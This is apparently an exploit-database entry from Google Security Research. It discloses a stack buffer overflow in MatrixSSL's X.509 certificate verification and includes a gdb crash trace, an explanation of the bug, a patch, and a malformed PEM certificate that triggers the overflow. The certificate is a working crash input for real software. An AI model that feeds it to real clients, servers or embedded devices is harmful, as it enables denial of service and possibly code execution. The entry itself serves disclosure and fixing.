{
    "text": "published_time: 2019-02-20 ， id: 40275 ， eid: 46435 ， cve: N/A ， title: MatrixSSL < 4.0.2 - Stack Buffer Overflow Verifying x.509 Certificates - Linux dos Exploit ， author: Google Security Research ， published_time: 2019-02-20 ， verified: Verified ， platform: Linux ， exploit_type: dos ， exploit_url: /download/46435 ， exploit_detail: I happened to notice that a public X.509 certificate testcase for CVE-2014-1569 caused a stack buffer overflow in MatrixSSL.\r ， I cleaned up the testcase a bit, to make a better demonstration. You can test it with the certValidate tool that comes with MatrixSSL.\r ， $ gdb -q -args matrixssl/matrixssl/test/certValidate stackbufferoverflow.pem\r ， Reading symbols from matrixssl/matrixssl/test/certValidate...done.\r ， (gdb) r\r ， Starting program: matrixssl/matrixssl/test/certValidate stackbufferoverflow.pem\r ， [Thread debugging using libthread_db enabled]\r ， Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\r ，   Loaded chain file stackbufferoverflow.pem\r ，         [0]:berserk.filippo.io\r ，         [1]:(null)\r ， WARN subject not provided, SUBJ validation will be skipped\r ， Program received signal SIGSEGV, Segmentation fault.\r ， 0x00005555555c5164 in pubRsaDecryptSignedElementExt\r ， (gdb) bt\r ， #0  0x00005555555c5164 in pubRsaDecryptSignedElementExt\r ， #1  0x4141414141414141 in ?? ()\r ， #2  0x0000000000000000 in ?? ()\r ， I believe any client or server that validates certificates will be affected by this, and as MatrixSSL is usually used in embedded devices where mitigations are usually not quite as thorough as modern distributions, exploitation might not be difficult.\r ， The bug is that pubRsaDecryptSignedElementExt() uses a fixed size stack buffer, but then doesn't check if the key size exceeds it. The patch below should solve it.\r ， diff -git a/crypto/pubkey/rsa_pub.c b/crypto/pubkey/rsa_pub.c\r ， index f1d57e0..fa36e42 100644\r ， --- a/crypto/pubkey/rsa_pub.c\r ， +++ b/crypto/pubkey/rsa_pub.c\r ，  -63,6 +63,12  int32_t psRsaDecryptPubExt(psPool_t *pool,\r ， +    if (*outlen < key->size)\r ， +    {\r ， +        psTraceCrypto(\"Error on bad outlen parameter to psRsaDecryptPub\\n\");\r ， +        return PS_ARG_FAIL;\r ， +    }\r ，      ptLen = inlen;\r ，      /* Raw, in-place RSA decryption. */\r ， I'm filing this issue just for tracking, as the testcase is already public I just went ahead and created a public issue:\r ， It looks like the maintainers are preparing to publish version 4.0.2 to correct this bug:\r ， -BEGIN CERTIFICATE-\r ， MIID+DCCAuCgAwIBAgIIAAAAAAAAAAAwDQYJKoZIhvcNAQEFBQAwYzELMAkGA1UEBhMCVVMxITAf\r ， BgNVBAoTGFRoZSBHbyBEYWRkeSBHcm91cCwgSW5jLjExMC8GA1UECxMoR28gRGFkZHkgQ2xhc3Mg\r ， MiBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTAeFw0xNjA1MDUxNDUwMzMAFw0xNzA1MDUxNDU1MzMA\r ， MHMxCzAJBgMAAAAAAgAAMRIwEAYDAAAAAAkAAAAAAAAAAAAxGzAZBgMAAAAAEgAAAAAAAAAAAAAA\r ， AAAAAAAAADEWMBQGAwAAAAANAAAAAAAAAAAAAAAAADEbMBkGA1UEAxMSYmVyc2Vyay5maWxpcHBv\r ， LmlvMIIAADANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6AAAAAAAAAAAAAAAAAAAAAAAAAAA\r ， AAAAAAAAAAIDAAAAo4EAMIGcMAAGA1UdDwEBAAQAAwIAADAABgNVHSUEADAUBggAAAAAAAAAAAYI\r ， AAAAAAAAAAAwAAYDVR0TAQEABAAwADAABgNVHQ4EAAQUAAAAAAAAAAAAAAAAAAAAAAAAAAAwHwYD\r ， AAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwHQYDAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAA\r ， AAAAMA0GCSqGSIb3DQEBBQUAA4IBAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r ， AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoU9YAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r ， AAAAAAAAAAAAAAAAAAAAAAAAAAAAIRcuKDsOIw8AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r ， -END CERTIFICATE-\r ， -BEGIN CERTIFICATE-\r ， MIIEADCCAuigAwIBAgIBADANBgkqhkiG9w0BAQUFADBjMQswCQYDVQQGEwJVUzEh\r ， MB8GA1UEChMYVGhlIEdvIERhZGR5IEdyb3VwLCBJbmMuMTEwLwYDVQQLEyhHbyBE\r ， YWRkeSBDbGFzcyAyIENlcnRpZmljYXRpb24gQXV0aG9yaXR5MB4XDTA0MDYyOTE3\r ， MDYyMFoXDTM0MDYyOTE3MDYyMFowYzELMAkGA1UEBhMCVVMxITAfBgNVBAoTGFRo\r ， ZSBHbyBEYWRkeSBHcm91cCwgSW5jLjExMC8GA1UECxMoR28gRGFkZHkgQ2xhc3Mg\r ， MiBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTCCASAwDQYJKoZIhvcNAQEBBQADggEN\r ， ADCCAQgCggEBAN6d1+pXGEmhW+vXX0iG6r7d/+TvZxz0ZWizV3GgXne77ZtJ6XCA\r ， PVYYYwhv2vLM0D9/AlQiVBDYsoHUwHU9S3/Hd8M+eKsaA7Ugay9qK7HFiH7Eux6w\r ， wdhFJ2+qN1j3hybX2C32qRe3H3I2TqYXP2WYktsqbl2i/ojgC95/5Y0V4evLOtXi\r ， EqITLdiOr18SPaAIBQi2XKVlOARFmR6jYGB0xUGlcmIbYsUfb18aQr4CUWWoriMY\r ， avx4A6lNf4DD+qta/KFApMoZFv6yyO9ecw3ud72a9nmYvLEHZ6IVDd2gWMZEewo+\r ， YihfukEHU1jPEX44dMX4/7VpkI+EdOqXG68CAQOjgcAwgb0wHQYDVR0OBBYEFNLE\r ， sNKR1EwRcbNhyz2h/t2oatTjMIGNBgNVHSMEgYUwgYKAFNLEsNKR1EwRcbNhyz2h\r ， /t2oatTjoWekZTBjMQswCQYDVQQGEwJVUzEhMB8GA1UEChMYVGhlIEdvIERhZGR5\r ， IEdyb3VwLCBJbmMuMTEwLwYDVQQLEyhHbyBEYWRkeSBDbGFzcyAyIENlcnRpZmlj\r ， YXRpb24gQXV0aG9yaXR5ggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQAD\r ， ggEBADJL87LKPpH8EsahB4yOd6AzBhRckB4Y9wimPQoZ+YeAEW5p5JYXMP80kWNy\r ， OO7MHAGjHZQopDH2esRU1/blMVgDoszOYtuURXO1v0XJJLXVggKtI3lpjbi2Tc7P\r ， TMozI+gciKqdi0FuFskg5YmezTvacPd+mSYgFFQlq25zheabIZ0KbIIOqPjCDPoQ\r ， HmyW74cNxA9hi63ugyuV+I6ShHI56yDqg+2DzZduCLzrTia2cyvk0/ZM/iZx4mER\r ， dEr/VxqHD3VILs9RaRegAhJhldXRQLIQTO7ErBBDpqWeCtWVYpoNz4iCxTIM5Cuf\r ， ReYNnyicsbkqWletNw+vHX/bvZ8=\r ， -END CERTIFICATE-"
}